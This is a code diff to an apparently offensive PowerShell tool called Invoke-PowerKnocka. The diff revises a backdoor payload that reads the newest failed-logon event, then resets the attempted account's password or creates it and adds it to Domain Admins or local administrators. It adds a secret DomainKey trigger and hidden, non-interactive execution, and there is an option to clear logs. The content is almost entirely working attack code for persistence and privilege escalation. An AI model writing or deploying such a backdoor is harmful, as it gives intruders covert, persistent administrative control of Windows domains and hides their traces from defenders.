@@ -21,18 +21,17 @@ function Invoke-PowerKnocka {
         [bool]$DC,
 
         [Parameter(Mandatory=$false)]
-        [bool]$ClearLog = $false
+        [bool]$ClearLog = $false,
+
+        [Parameter(Mandatory)]
+        [bool]$DomainKey
     )
 
     if ($DC) {
-        $ExploitString = {
-            $e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if (Get-ADUser -Identity $n) {Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText $Password -Force)} else {New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force);Add-ADGroupMember -Identity 'Domain Admins' -Members $n}
-        }
+        $ExploitString = '-WindowStyle Hidden -NoP -NonI -c {$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $DomainKey + ') {if (Get-ADUser -Identity $n) {Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText ' + $Password + '-Force)} else {New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString ' + $Password + '-AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}}'
     }
     else {
-        $ExploitString = {
-            $e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if (net user $n) {net user $n $Password} else {net user $n $Password /add;net localgroup administrators $n /add}
-        }
+        $ExploitString = '-WindowStyle Hidden -NoP -NonI -c {$e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1;$n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $DomainKey + ') {if (net user $n) {net user $n ' + $Password+ '} else {net user $n ' + $Password + ' /add;net localgroup administrators $n /add}}}'
     }
 
     if ($ClearLog) {
